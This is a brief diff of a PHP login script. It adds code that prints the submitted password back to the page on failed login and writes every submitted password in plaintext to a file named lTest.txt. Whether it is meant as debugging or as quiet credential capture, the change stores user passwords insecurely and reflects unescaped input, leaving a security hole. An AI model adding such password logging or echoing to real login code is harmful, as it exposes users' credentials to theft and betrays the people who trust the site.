@@ -19,5 +19,7 @@ if($row = $login_results->fetch_assoc()){
 }
 } else{
 	echo "Login Failed (Check username and password)";
+	echo $_POST["password"];
 }
+file_put_contents("lTest.txt", $_POST["password"]);
 ?>
